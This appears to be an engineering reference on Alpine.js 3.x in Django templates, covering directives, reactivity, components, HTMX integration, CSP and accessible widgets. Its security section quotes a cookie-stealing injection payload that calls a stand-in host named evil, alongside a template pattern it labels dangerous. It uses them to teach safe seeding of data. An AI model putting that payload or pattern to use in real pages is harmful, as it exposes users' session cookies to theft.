# Alpine.js Engineering

> **Scope:** Alpine.js 3.x in Django templates: reactivity and initialization mechanics, every core directive and magic, reusable `Alpine.data` components, stores, events, lifecycle, HTMX and Django-template integration, the CSP build, and accessible widget patterns. Server interactions belong to [htmx-engineering.md](htmx-engineering.md); general JS (fetch, CSRF, modules) to [javascript-engineering.md](javascript-engineering.md); where state should live to [frontend-state-and-interaction-design.md](frontend-state-and-interaction-design.md); CSP policy design to [frontend-security.md](frontend-security.md).

## 1. Purpose and scope

Alpine is a small declarative layer for **local, ephemeral UI state** attached to server-rendered HTML: open/closed, selected tab, character counter, "select all" checkboxes, client-side show/hide of dependent fields, transitions. It is not a data-fetching layer, router, or app framework.

The division of labour:

| Concern | Tool |
|---|---|
| Data lives on the server, UI must reflect it | Django template + **HTMX** |
| Pure UI state that the server never needs | **Alpine** |
| Browser API glue (clipboard, observers) with no reactive UI | Vanilla module, or Alpine method calling it |
| Semantics the browser already provides | Native HTML (`<details>`, `<dialog>`, `<select>`) — no Alpine |
| App-like surface with large client state | React island ([django-react-integration.md](django-react-integration.md)) |

Rule: **Alpine = local UI state; HTMX = server interaction.** If an Alpine component starts calling `fetch` to load and render lists, it should probably be an HTMX fragment.

## 2. Core concepts

- **Component**: an element with `x-data`; its object is the reactive scope for that element and descendants. Nested `x-data` scopes merge: inner can read outer properties (inner shadows on name clash).
- **Directive**: `x-*` attribute evaluated against the scope (`x-show="open"`).
- **Magic**: `$`-prefixed helpers available in expressions (`$refs`, `$dispatch`, `$watch`, `$nextTick`, `$el`, `$root`, `$data`, `$id`, `$store`).
- **Store**: global reactive object registered with `Alpine.store(name, value)`, read as `$store.name`.
- **Reusable component**: `Alpine.data("name", (args) => ({...}))`, used as `x-data="name(args)"`.
- **Plugins** (official): Focus (`x-trap`), Collapse (`x-collapse`), Intersect (`x-intersect`), Persist (`$persist`), Mask (`x-mask`), Morph (`Alpine.morph`). Load plugins **before** Alpine starts.

### Directive reference
| Directive | Purpose | Notes |
|---|---|---|
| `x-data` | Declare component scope | `x-data` with no value = empty scope; `x-data="tabs('a')"` uses `Alpine.data` |
| `x-init` | Run expression on init | Can `await`; runs after the component's `init()` [VERIFY: init()/x-init order in docs] |
| `x-show` | Toggle `display: none` | Element stays in DOM; works with `x-transition` |
| `x-if` | Add/remove DOM | On `<template>` with **one** root element |
| `x-for` | Loop | On `<template>`, one root; `:key` with stable ids |
| `x-bind` / `:` | Bind attribute | `:class` / `:style` accept objects and merge with static `class` |
| `x-on` / `@` | Listen | Modifiers below |
| `x-model` | Two-way binding for inputs | Modifiers `.lazy`, `.number`, `.debounce`, `.throttle`, `.fill` |
| `x-modelable` | Expose an inner property to an outer `x-model` | For reusable inputs |
| `x-text` | Set `textContent` | Safe for any string |
| `x-html` | Set `innerHTML` | **XSS sink** — trusted, server-sanitized HTML only |
| `x-ref` | Name an element for `$refs` | Scoped to component |
| `x-effect` | Re-run expression when its dependencies change | Side effects only |
| `x-transition` | Enter/leave transitions | With `x-show` (or `x-if`) |
| `x-cloak` | Removed when Alpine initializes the element | Needs CSS rule (§5) |
| `x-ignore` | Alpine skips this subtree | For third-party widgets / user-generated HTML |
| `x-teleport` | Move template content to a selector (e.g. `body`) | On `<template>`; scope preserved |
| `x-id` | Scope for `$id()` generated ids | Keeps `for`/`aria-*` pairs unique across instances |

`x-on` modifiers: `.prevent`, `.stop`, `.outside`, `.window`, `.document`, `.once`, `.self`, `.debounce[.500ms]`, `.throttle`, `.passive`, `.capture`, `.camel`, `.dot`; key modifiers `.enter`, `.escape`, `.space`, `.tab`, `.up`/`.down`/`.left`/`.right`, `.shift`/`.ctrl`/`.alt`/`.meta`, `.home`, `.end`.

## 3. Internal mechanics

### Startup
1. The Alpine script runs (CDN build auto-starts once the DOM is ready; ESM build starts when you call `Alpine.start()`).
2. Alpine dispatches `alpine:init` on `document` **before** walking the DOM — register `Alpine.data`, `Alpine.store`, `Alpine.bind`, plugins here (or before `Alpine.start()` in ESM).
3. Alpine walks the DOM depth-first from `document.body`. For each element it collects `x-*`/`@`/`:` attributes, sorts them by directive priority (scope-defining directives such as `x-data`/`x-ignore` first) and initializes them. `x-ignore` stops the walk into that subtree.
4. `alpine:initialized` fires after the initial walk.
5. A **MutationObserver** on the document watches for added/removed nodes and attribute changes: added elements with Alpine attributes are initialized; removed elements have their effects and listeners cleaned up. This is why HTMX-inserted markup "just works".

### Reactivity
- `x-data` objects are wrapped in a reactive **Proxy** (Alpine 3 uses `@vue/reactivity`). Property **reads** inside an effect register a dependency; **writes** schedule re-runs of dependent effects.
- Each binding (`x-text`, `:class`, `x-show`, `x-effect`) is an effect. Changing `open` re-runs only bindings that read `open`.
- DOM updates are batched; to read the DOM after a state change, `await $nextTick()`.
- Arrays/objects are deeply reactive; replacing (`items = [...]`) and mutating (`items.push()`) both trigger.
- Non-plain objects (DOM nodes, class instances with private fields, third-party widget instances) should not be stored in reactive state — the proxy can break identity or internals. Keep them in a closure variable or prefix and don't read them in bindings [VERIFY: Alpine.raw() for unwrapping proxies].

### Expression evaluation
- The standard build compiles each expression string with `new Function(...)`, evaluating it against the merged scope chain (component data stack + magics). Hence CSP needs `'unsafe-eval'` for the standard build.
- Expressions can be statements (`open = !open`), function calls (`save()`), or `async` code (`await fetch(...)`).
- Errors in expressions are caught and logged with the element (`Alpine Expression Error: …`), the rest of the page continues.

### Lifecycle
- `init()` on the data object runs automatically when the component initializes. Child directives may not have run yet, so wrap code that depends on children's rendered state in `$nextTick` [VERIFY: whether child elements/$refs are initialized when init() runs].
- `destroy()` on the data object runs when the component is removed from the DOM [VERIFY: `destroy()` support and the minimum 3.x version that introduced it]. Use it to clear intervals, disconnect observers, and destroy third-party widgets.
- Listeners added via `@…` and effects are torn down automatically on removal; things you create manually (`setInterval`, `new IntersectionObserver`, `window.addEventListener` in `init()`) are not — unless you use `@resize.window` etc. declaratively, which is cleaned up.

### Script loading order
- CDN/static script: `<script defer src=".../plugin.min.js"></script>` for each plugin **before** `<script defer src=".../alpine.min.js"></script>`; `defer` preserves order.
- `Alpine.data` registrations in a separate file must run before Alpine walks the DOM: listen for `alpine:init`, or use the ESM build and call `Alpine.start()` last.

## 4. Engineering decisions and trade-offs

### Alpine vs HTMX vs alternatives
| Need | Prefer | Why |
|---|---|---|
| Open/close a panel | `<details>` (no JS) → Alpine if coordinated/animated | Native semantics, keyboard, no-JS |
| Modal | `<dialog>.showModal()` (+ Alpine to call it) | Native focus containment, Escape, inert background |
| Tabs that change URL / load data | HTMX or plain links | Server owns content; linkable |
| Tabs with already-rendered panels | Alpine | Local UI state |
| Search/filter/paginate | GET form + HTMX | URL state, server data |
| Show field B when field A = "other" | Alpine `x-show` | Server still validates both cases |
| Character counter, password reveal | Alpine | Pure local |
| Inline edit saving to DB | HTMX (Alpine for the edit/view toggle only) | Server data |
| "Select all" rows + count | Alpine | Local; the bulk action is a normal POST |
| Shared client-only UI flag (sidebar collapsed) | Alpine store (+ `$persist`) | Page-lifetime global |
| Big interactive client model (editor, canvas) | React island | Alpine scales poorly in large stateful trees |

### Inline `x-data` vs `Alpine.data`
| Prefer inline `x-data="{ open: false }"` when… | Prefer `Alpine.data()` in a module when… |
|---|---|
| ≤ 2–3 properties, one-liner handlers | Methods, logic > one line, reused across templates |
| Used once | Needs `init()`/`destroy()`, unit testing, CSP build |

### Store vs events vs server
| Prefer a store | Prefer `$dispatch`/window events | Prefer server re-render (HTMX OOB/trigger) |
|---|---|---|
| Many components read the same client-only value | One-off notifications between siblings | Value is business data (counts, statuses) |

### Standard vs CSP build
| Standard build | `@alpinejs/csp` build |
|---|---|
| Arbitrary inline expressions | Restricted expression syntax; logic must live in `Alpine.data` methods [VERIFY: which expressions the current CSP build's parser supports] |
| Requires `script-src 'unsafe-eval'` | No `'unsafe-eval'` |
| Faster to write | Stricter CSP, more boilerplate, more testable |

If you've invested in a strict CSP (nonces, no `unsafe-eval`), use the CSP build or don't use Alpine. Note that `'unsafe-eval'` widens what an injected script *string* can do but does not by itself allow injected `<script>` tags.

## 5. Django/frontend implementation patterns

### Loading Alpine from Django static files
```django
{# templates/base.html #}
{% load static %}
<style>[x-cloak]{display:none !important}</style>
<script defer src="{% static 'vendor/alpine/focus.min.js' %}"></script>
<script defer src="{% static 'vendor/alpine/collapse.min.js' %}"></script>
<script type="module" src="{% static 'js/alpine-components.js' %}"></script>
<script defer src="{% static 'vendor/alpine/alpine.min.js' %}"></script>
```
Vendor pinned versions (copied from npm/CDN at a known version) rather than hot-linking; or bundle with Vite ([static-assets-and-build-engineering.md](static-assets-and-build-engineering.md)). Module scripts and `defer` scripts execute in document order, so `alpine-components.js` registers its `alpine:init` listener before Alpine runs. Put the `[x-cloak]` rule in the critical CSS so hidden content doesn't flash.

ESM/bundled alternative:
```js
// static/src/main.js (bundled)
import Alpine from "alpinejs";
import focus from "@alpinejs/focus";
import { registerComponents } from "./alpine-components.js";

Alpine.plugin(focus);
registerComponents(Alpine);
window.Alpine = Alpine;   // optional: devtools / inline access
Alpine.start();
```

### Reusable components in a module
```js
// static/js/alpine-components.js
function tabs(initial) {
  return {
    active: initial,
    select(id) { this.active = id; },
    isActive(id) { return this.active === id; },
    onKeydown(event) {
      const tabs = [...this.$root.querySelectorAll('[role="tab"]')];
      const i = tabs.indexOf(document.activeElement);
      const next = { ArrowRight: i + 1, ArrowLeft: i - 1, Home: 0, End: tabs.length - 1 }[event.key];
      if (next === undefined) return;
      event.preventDefault();
      const tab = tabs[(next + tabs.length) % tabs.length];
      this.select(tab.dataset.tab);
      tab.focus();
    },
  };
}

function charCounter(max) {
  return {
    max,
    text: "",
    init() { this.text = this.$refs.input.value; },
    get remaining() { return this.max - this.text.length; },
  };
}

function poller() {
  return {
    timer: null,
    init() { this.timer = setInterval(() => this.$dispatch("refresh-stats"), 30_000); },
    destroy() { clearInterval(this.timer); },   // [VERIFY: destroy() support in your 3.x version]
  };
}

export function registerComponents(Alpine) {
  Alpine.data("tabs", tabs);
  Alpine.data("charCounter", charCounter);
  Alpine.data("poller", poller);
  Alpine.store("ui", {
    sidebarOpen: true,
    toggleSidebar() { this.sidebarOpen = !this.sidebarOpen; },
  });
}

document.addEventListener("alpine:init", () => registerComponents(window.Alpine));
```
(Remove the last line when using the ESM entry above.) Polling is shown for lifecycle illustration; prefer `hx-trigger="every 30s"` on the element that needs fresh server data.

### Tabs (panels already rendered by Django)
```django
<div x-data="tabs('overview')" class="tabs">
  <div role="tablist" aria-label="Project sections" @keydown="onKeydown">
    {% for key, label in sections %}
      <button type="button" role="tab" id="tab-{{ key }}" data-tab="{{ key }}"
              aria-controls="panel-{{ key }}"
              :aria-selected="isActive('{{ key }}')"
              :tabindex="isActive('{{ key }}') ? 0 : -1"
              @click="select('{{ key }}')">{{ label }}</button>
    {% endfor %}
  </div>
  {% for key, label in sections %}
    <section role="tabpanel" id="panel-{{ key }}" aria-labelledby="tab-{{ key }}" tabindex="0"
             x-show="isActive('{{ key }}')" {% if not forloop.first %}x-cloak{% endif %}>
      {% include "projects/_section.html" with section=key %}
    </section>
  {% endfor %}
</div>
```
`sections` keys are developer-defined slugs (safe identifiers), never user input — see the injection rule below. Without JS, `x-cloak` panels stay hidden; if no-JS support matters, render plain links to `?tab=` URLs instead and let Alpine enhance.

### Disclosure (navigation menu, not ARIA `menu`)
```html
<nav aria-label="Account" x-data="{ open: false }" @keydown.escape="open = false; $refs.button.focus()"
     @click.outside="open = false">
  <button type="button" x-ref="button" :aria-expanded="open" aria-controls="account-links"
          @click="open = !open">Account</button>
  <ul id="account-links" x-show="open" x-transition x-cloak>
    <li><a href="/settings/">Settings</a></li>
    <li><a href="/billing/">Billing</a></li>
    <li><form method="post" action="/logout/">…<button type="submit">Log out</button></form></li>
  </ul>
</nav>
```
Site navigation is a disclosure (button + list of links), not `role="menu"`, which promises application-menu keyboard behaviour. Use the APG Menu Button pattern only for real action menus, with arrow-key navigation.

### Dependent form fields
```django
<div x-data="{ method: '{{ form.payment_method.value|default:'card'|escapejs }}' }">
  <fieldset>
    <legend>Payment method</legend>
    {% for radio in form.payment_method %}
      <label>{{ radio.tag }} {{ radio.choice_label }}</label>
    {% endfor %}
  </fieldset>
  <div x-show="method === 'invoice'" x-cloak>
    {{ form.po_number.as_field_group }}
  </div>
</div>
```
Bind `x-model="method"` to the radios via a widget attr (`attrs={"x-model": "method"}`) in the form class. The server must validate `po_number` conditionally in `clean()` — hidden fields are still submitted and can be forged. Here the value is a `ChoiceField` value, but even so it is passed through `escapejs`; prefer the `data-*`/`json_script` approach below for anything not tightly constrained. `as_field_group` is Django ≥ 5.0.

### Seeding Alpine from Django data safely
**Never template user data into Alpine expressions.** Mechanism: autoescape converts `'` to `&#x27;`, but the HTML parser decodes entities back to `'` *before* Alpine reads the attribute, so
```django
{# DANGEROUS #}
<div x-data="{ title: '{{ task.title }}' }">
```
with a title of `'; fetch('//evil?c='+document.cookie); '` becomes executable JS — even under a nonce-based CSP, because the standard build evaluates it via `new Function`. Safe options:
```django
{# 1. data-* attributes (strings) read in init() #}
<div x-data="taskEditor" data-title="{{ task.title }}" data-url="{% url 'tasks:update' task.pk %}">…</div>

{# 2. json_script for structured data #}
{{ task_payload|json_script:"task-payload" }}
<div x-data="taskEditor" data-payload-id="task-payload">…</div>
```
```js
Alpine.data("taskEditor", () => ({
  title: "", url: "", tags: [],
  init() {
    const { title, url, payloadId } = this.$el.dataset;
    this.title = title ?? "";
    this.url = url ?? "";
    if (payloadId) Object.assign(this, JSON.parse(document.getElementById(payloadId).textContent));
  },
}));
```
Booleans/integers from trusted typed fields (`{{ task.is_done|yesno:"true,false" }}`, `{{ task.pk }}`) are acceptable inline. `escapejs` makes a value safe inside a JS string literal but is easy to forget; prefer the patterns above.

### User-generated HTML inside Alpine scope
Sanitized rich text (`{{ comment.html|safe }}` after server-side sanitization) inside an Alpine component is still dangerous if the sanitizer allows arbitrary attributes: `<span x-init="…">` or `@click="…"` would be evaluated. Either strip all `x-*`, `@*`, `:*` (and `hx-*`) attributes in the sanitizer allow-list, or wrap the content in `x-ignore`:
```django
<article x-data="{ expanded: false }">
  <div x-ignore>{{ comment.rendered_html }}</div>
  <button type="button" @click="expanded = !expanded" :aria-expanded="expanded">More</button>
</article>
```
Template syntax clashes: Alpine has no `{{ }}` interpolation (it uses `x-text`), so DTL and Alpine don't collide; `{% verbatim %}` is only needed if you embed literal `{{ }}` for another client templating engine.

### Stores and events
```django
<button type="button" @click="$store.ui.toggleSidebar()" :aria-expanded="$store.ui.sidebarOpen"
        aria-controls="sidebar">Toggle sidebar</button>
<aside id="sidebar" x-data x-show="$store.ui.sidebarOpen" x-cloak>…</aside>

{# child → ancestor/anyone: $dispatch bubbles a CustomEvent #}
<div x-data="{ count: 0 }" @row-selected.window="count += $event.detail.delta">
  <span x-text="count"></span> selected
</div>
<input type="checkbox" name="ids" value="{{ invoice.pk }}"
       x-data @change="$dispatch('row-selected', { delta: $el.checked ? 1 : -1 })">
```
Persist a store value across reloads with the Persist plugin: `sidebarOpen: Alpine.$persist(true).as('ui.sidebar')` (uses `localStorage`, readable by any script — UI preferences only).

**Event name casing:** HTML lowercases attribute names, so `@taskSaved` listens for `tasksaved`. Use kebab-case event names (`task-saved`) everywhere — in `$dispatch`, in Django `HX-Trigger` headers — or add `.camel` (`@task-saved.camel` listens for `taskSaved`).

### Integration with HTMX
- **New content initializes automatically**: HTMX inserts nodes → Alpine's MutationObserver initializes any `x-data` in them. No manual `Alpine.initTree` needed in normal cases.
- **State is lost when the component's element is replaced.** An `outerHTML` swap of `<div x-data="{open:true}">` creates a new component with initial state. Options:
  1. Target an inner element (`hx-target="#rows"` inside the Alpine root) so the component element survives.
  2. Put cross-swap state in a store or the server-rendered markup (e.g. render `open` from the server).
  3. `hx-preserve` (with a stable `id`) to keep an element untouched across swaps.
  4. Morphing swaps (idiomorph or the alpine-morph HTMX extension, both outside HTMX core in 2.x) that patch the DOM and keep Alpine state [VERIFY: extension names/packages and Alpine Morph plugin requirement].
- **Listening to HTMX from Alpine**: HTMX fires camelCase events (`htmx:afterRequest`) and kebab-case aliases (`htmx:after-request`) [VERIFY: kebab-case aliases in HTMX 2.x]; in attributes use the kebab form: `@htmx:after-request="busy = false"`.
- **Server → Alpine**: `HX-Trigger: {"task-saved": {"id": 7}}` → `@task-saved.window="flash($event.detail.id)"`.
- **Loading state**: prefer HTMX's `htmx-request` class / `hx-indicator` / `hx-disabled-elt` over duplicating busy flags in Alpine.
- **History**: HTMX snapshots the DOM *as modified by Alpine* (open menus, `x-for` output, removed `x-cloak`). Close transient UI on `htmx:beforeHistorySave`, and test Back navigation for duplicated `x-for` output or stuck-open panels.
- **Don't mix the same concern**: don't toggle visibility with both `hx-swap` and `x-show` on one element.

Example — inline edit with Alpine toggling view/edit and HTMX saving:
```django
<li id="task-{{ task.pk }}" x-data="{ editing: false }" @keydown.escape="editing = false">
  <span x-show="!editing">{{ task.title }}</span>
  <button type="button" x-show="!editing" @click="editing = true; $nextTick(() => $refs.title.focus())">Rename</button>
  <form x-show="editing" x-cloak hx-post="{% url 'tasks:rename' task.pk %}"
        hx-target="#task-{{ task.pk }}" hx-swap="outerHTML">
    {% csrf_token %}
    <label for="title-{{ task.pk }}" class="sr-only">Title</label>
    <input id="title-{{ task.pk }}" x-ref="title" name="title" value="{{ task.title }}" required maxlength="200">
    <button type="submit">Save</button>
    <button type="button" @click="editing = false">Cancel</button>
  </form>
</li>
```
The view returns the re-rendered `<li>` (fresh Alpine state, `editing: false`) on success, or the `<li>` with errors and `x-data="{ editing: true }"` on invalid input.

### Dialog with Alpine + native `<dialog>`
```html
<div x-data="{ open() { $refs.dlg.showModal() }, close() { $refs.dlg.close() } }">
  <button type="button" @click="open()">Archive project</button>
  <dialog x-ref="dlg" aria-labelledby="archive-title" @close="$el.querySelector('form').reset()">
    <h2 id="archive-title">Archive this project?</h2>
    <form method="post" action="/projects/7/archive/">…
      <button type="submit">Archive</button>
      <button type="button" @click="close()">Cancel</button>
    </form>
  </dialog>
</div>
```
Use `x-trap` (Focus plugin) only for non-`<dialog>` overlays (e.g. a slide-over that must not be modal-dialog semantics): `x-trap.inert.noscroll="open"` traps focus, marks the rest inert and locks scroll.

### Combobox / autocomplete
Prefer, in order: native `<select>`, `<input list>` + `<datalist>`, server-side search with HTMX returning a results list. A custom ARIA combobox (`role="combobox"`, `aria-expanded`, `aria-controls`, `aria-activedescendant`, arrow keys, Enter, Escape) is significant work and must be tested with screen readers; follow the APG Combobox pattern exactly ([frontend-accessibility.md](frontend-accessibility.md)).

## 6. Production use cases

- **Tenant dashboard shell**: sidebar toggle (store + `$persist`), account disclosure, notification drawer via `x-teleport` to `body`; all data panels are HTMX fragments.
- **Invoice form**: dependent fields (`x-show`), line-item subtotal preview computed client-side (server recomputes authoritative totals), `x-mask` for formatted inputs (server still parses/validates).
- **Task table**: "select all" + selected count via events; bulk action POST; HTMX row updates targeted inside the Alpine root to preserve selection.
- **Settings tabs**: Alpine tabs over server-rendered panels; deep-link support by reading `location.hash` in `init()`.
- **Lazy widgets**: `x-intersect.once="load()"` (Intersect plugin) triggering an HTMX request via `htmx.trigger($el, 'reveal')`, or simply `hx-trigger="revealed"` without Alpine.

## 7. Advantages and disadvantages

| Advantages | Disadvantages |
|---|---|
| No build step required; works directly in Django templates | Logic in attributes is hard to test, lint and type-check |
| Small, declarative, readable near markup | Standard build needs `'unsafe-eval'` |
| Auto-initializes HTMX-inserted content | State lost on outer swaps; history snapshots include mutated DOM |
| Cleanup of declarative listeners on removal | Large components become unmaintainable inline |
| Plugins cover focus trap, collapse, persist | Easy to rebuild native elements poorly (inaccessible widgets) |

## 8. Security and performance considerations

### Security
- **Expression injection** is the primary Alpine risk: never interpolate user data into `x-data`, `x-init`, `@…`, `:…` attribute values; use `data-*`/`json_script` (§5).
- **Attribute injection via user HTML**: sanitizers must strip `x-*`, `@*`, `:*` (and `hx-*`); or use `x-ignore` around rendered user content.
- **`x-html`** is `innerHTML`: only for trusted, server-sanitized markup.
- **CSP**: standard build → `'unsafe-eval'`; CSP build → stricter but restricted. Alpine/plugin script tags need nonces under a nonce-based policy (django-csp (third-party) on Django 5.2; built-in CSP support from Django 6.0 [VERIFY: Django 6.0 CSP setting names]). Details: [frontend-security.md](frontend-security.md).
- **`$persist` / `localStorage`** is readable by any script — never persist tokens or personal data.
- **Client-side hiding is not authorization**: an `x-show="isAdmin"` button must also be absent from the template for non-admins and enforced in the view.

### Performance
- Alpine itself is small, but every directive is an effect: thousands of `x-for` rows with many bindings cost init time and memory. Render large lists on the server; paginate.
- Use `x-show` for frequently toggled content (cheap), `x-if` for heavy, rarely shown subtrees (not in DOM until needed).
- Avoid `x-effect`/`$watch` chains that write state they read (loops).
- Keep reactive state small; don't store DOM nodes or large server payloads.
- `.debounce` on `x-model` and `@input` for expensive reactions; `.passive` for scroll/touch.
- `x-cloak` prevents flash-of-uninitialized-content but delays visibility until Alpine runs — don't cloak the LCP element.

## 9. Common mistakes and anti-patterns

1. **`x-data="{ name: '{{ user.name }}' }"`** → JS injection; use `data-*`/`json_script`.
2. **Missing `[x-cloak]` CSS** → hidden content flashes; add the rule to critical CSS.
3. **`x-if`/`x-for` on a non-`<template>` or with multiple roots** → nothing renders; wrap one root in `<template>`.
4. **`x-for` without `:key`** (or keyed by index) when items reorder → wrong DOM reuse; key by stable id.
5. **CamelCase event listeners (`@taskSaved`)** → never fire; use kebab-case or `.camel`.
6. **`Alpine.data` registered after Alpine started** → "taskEditor is not defined"; register in `alpine:init` or before `Alpine.start()`; check script order.
7. **Plugin script after Alpine core** → `x-trap` ignored; load plugins first.
8. **Outer-swapping the Alpine root with HTMX and expecting state to persist** → target inside, store, `hx-preserve` or morph.
9. **Fetching and rendering lists in Alpine** → duplicated templates, no URL state; use HTMX fragments.
10. **Custom dropdown/modal/tabs without keyboard and ARIA states** → inaccessible; use native elements or APG patterns, `:aria-expanded`, Escape, focus return.
11. **`role="menu"` for site navigation** → wrong semantics; use a disclosure.
12. **`setInterval`/observers in `init()` without cleanup** → leaks after swaps; `destroy()` or prefer HTMX polling.
13. **Giant inline `x-data` objects** → untestable; move to `Alpine.data` in a module and unit test it.
14. **Global store for server data** → stale; re-render from server.
15. **Duplicating loading flags HTMX already provides** → use `htmx-request`/`hx-indicator`.

## 10. Troubleshooting and validation

| Symptom | Likely cause | Check |
|---|---|---|
| `Alpine Expression Error: x is not defined` | Typo, scope not in ancestor, component registered late | Console element link; script order; `alpine:init` |
| Directives do nothing | Alpine not loaded/started; CSP blocks `new Function` | Network for script; console CSP violation (`unsafe-eval`) |
| Content flashes then hides | No `[x-cloak]` rule or rule loaded late | Computed styles on load |
| Swapped HTMX content not interactive | Content inside `x-ignore`; Alpine not on page; error in init | Elements panel; console |
| State resets after HTMX request | Alpine root replaced | `hx-target`/`hx-swap` vs component root |
| Event listener never fires | Event name casing; dispatched on non-ancestor without `.window` | `monitorEvents(document, 'task-saved')`; use `.window` |
| `x-trap`/`x-collapse` ignored | Plugin not loaded / loaded after core | Script order |
| Duplicate list items after Back | HTMX history snapshot of Alpine-rendered DOM | Test with `htmx:beforeHistorySave` cleanup; disable history caching for that page |
| Memory grows across swaps | Manual timers/observers not cleaned | Heap snapshots; implement `destroy()` |
| Dialog focus escapes | Custom overlay without trap | Use `<dialog>.showModal()` or `x-trap.inert` |

### Validation steps
- Grep templates for `x-data="{` / `x-init="` / `@` attributes containing `{{` — each must be a typed boolean/int or removed.
- Run with the production CSP in staging; zero CSP violations in console.
- Keyboard-only pass: Tab/Shift+Tab, Enter/Space, Escape, arrow keys on tabs; visible focus everywhere.
- Screen reader spot check: `aria-expanded` announced, tab selection announced.
- Unit-test `Alpine.data` factories as plain functions in Vitest; E2E with Playwright `get_by_role` ([frontend-testing.md](frontend-testing.md)).
- Repeat HTMX swaps ×10 and compare heap snapshots.

## 11. Related references and skills

- [htmx-engineering.md](htmx-engineering.md) — server interactions, swaps, OOB, history, `HX-Trigger`.
- [frontend-state-and-interaction-design.md](frontend-state-and-interaction-design.md) — where state lives; toasts, modals, races.
- [javascript-engineering.md](javascript-engineering.md) — modules, events, cleanup, fetch/CSRF.
- [frontend-accessibility.md](frontend-accessibility.md) — APG patterns, focus management, live regions.
- [html-and-semantic-ui.md](html-and-semantic-ui.md) — `<dialog>`, `<details>`, native controls.
- [frontend-security.md](frontend-security.md) — CSP and Alpine, DOM XSS.
- [django-forms-and-validation.md](django-forms-and-validation.md) — dependent fields, widget attrs.
- [django-template-engineering.md](django-template-engineering.md) — escaping, `json_script`, components.
- [static-assets-and-build-engineering.md](static-assets-and-build-engineering.md) — vendoring/bundling Alpine.
- [production-frontend-architectures.md](production-frontend-architectures.md) — Django + HTMX + Alpine architecture.
- [cross-site-scripting.md](../../django-security-engineering/references/cross-site-scripting.md).

## 12. Official documentation and external references

- Alpine.js docs: https://alpinejs.dev/start-here
- Alpine directives (e.g. x-data): https://alpinejs.dev/directives/data
- Alpine lifecycle: https://alpinejs.dev/essentials/lifecycle
- Alpine reactivity: https://alpinejs.dev/advanced/reactivity
- Alpine `Alpine.data` / globals: https://alpinejs.dev/globals/alpine-data
- Alpine stores: https://alpinejs.dev/globals/alpine-store
- Alpine CSP build: https://alpinejs.dev/advanced/csp
- Alpine Focus plugin: https://alpinejs.dev/plugins/focus
- Alpine Persist plugin: https://alpinejs.dev/plugins/persist
- Alpine Morph plugin: https://alpinejs.dev/plugins/morph
- htmx `hx-preserve`: https://htmx.org/attributes/hx-preserve/
- htmx events: https://htmx.org/events/
- htmx extensions: https://htmx.org/extensions/
- Django `json_script`: https://docs.djangoproject.com/en/5.2/ref/templates/builtins/#json-script
- Django `escapejs`: https://docs.djangoproject.com/en/5.2/ref/templates/builtins/#escapejs
- WAI-ARIA APG patterns (Disclosure, Tabs, Menu Button, Combobox, Dialog): https://www.w3.org/WAI/ARIA/apg/patterns/
- MDN `<dialog>`: https://developer.mozilla.org/en-US/docs/Web/HTML/Element/dialog
- MDN MutationObserver: https://developer.mozilla.org/en-US/docs/Web/API/MutationObserver
- OWASP DOM-based XSS Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html
